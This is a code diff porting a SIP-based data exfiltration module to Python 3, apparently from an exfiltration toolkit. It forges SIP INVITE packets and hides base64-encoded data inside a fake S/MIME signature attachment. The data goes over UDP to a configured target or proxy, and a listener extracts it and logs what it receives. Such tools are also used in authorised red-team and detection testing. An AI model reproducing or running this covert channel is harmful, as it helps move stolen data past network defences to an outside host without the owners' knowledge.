@@ -57,7 +57,7 @@ class SIPDialog:
         self.uas = UserAgent(s_alias, s_ip, port=s_port, user_agent=user_agent)
         self.proxy = proxy
 
-    def invite(self, uac, uas, payload):
+    def invite(self, uac, uas, payload: str):
         #Call-ID magic identifier
         self.call_id = self.call_id[:3] + "42" + self.call_id[5:]
         #Branch magic identifier
@@ -67,7 +67,7 @@ class SIPDialog:
         self.proxy = self.proxy or '127.0.0.1' #keep calm & blame misconfiguration
         packet = sip.Request()
         #forge headers
-        packet.uri = 'sip:' + self.uas.alias + '@'+ self.uas.ip
+        packet.uri = 'sip:{}@{}'.format(self.uas.alias, self.uas.ip)
         packet.headers['Via'] = 'SIP/2.0/UDP {}:{};branch={}'.format(self.proxy, self.uac.port, self.branch)
         packet.headers['Max-Forwards'] = 70
         packet.headers['CSeq'] = '20 ' + packet.method
@@ -108,7 +108,7 @@ class SIPDialog:
         sig = 'Content-Type: application/x-pkcs7-signature; name="smime.p7s"\r\n'
         sig += 'Content-Transfer-Encoding: base64\r\n'
         sig += 'Content-Disposition: attachment; filename="smime.p7s"; handling=required\r\n'
-        sig += base64.b64encode(payload)
+        sig += base64.b64encode(payload.encode()).decode()
         #forge sip body
         boundary = ''.join(random.sample(string.digits + string.ascii_letters, 20))
         packet.body = '--' + boundary + '\r\n'
@@ -120,6 +120,7 @@ class SIPDialog:
         #replace sip header content-type with multipart/signed
         packet.headers['Content-Type'] = 'multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary=' + boundary
         #Update Content-Length
+        packet.body = packet.body.encode()
         packet.headers['Content-Length'] = str(len(packet.body))
 
         return packet
@@ -204,7 +205,7 @@ def listen():
                     parser = re.compile('boundary=(.*)')
                     [boundary] = re.findall(parser, req.headers['content-type'])
                     #Hackish payload isolation
-                    payload = req.body.split('--'+boundary)[-2].split('\r\n')[-2]
+                    payload = req.body.decode().split('--'+boundary)[-2].split('\r\n')[-2]
                     app_exfiltrate.log_message('info', "[sip] Received {0} bytes from {1}".format(len(payload), addr[0]))
                     app_exfiltrate.retrieve_data(base64.b64decode(payload))
         except Exception as e:
@@ -212,15 +213,15 @@ def listen():
             print('exception: ' + repr(e))
             pass
 
-def send(data):
-    if config.has_key('proxies') and config['proxies'] != [""]:
+def send(data: str):
+    if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
         target = config['target']
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('', port))
+    # sock.bind(('', port))
     dialog = SIPDialog()
     laddr = socket.gethostbyname(socket.getfqdn())
     uac = UserAgent(caller, laddr, port=port)
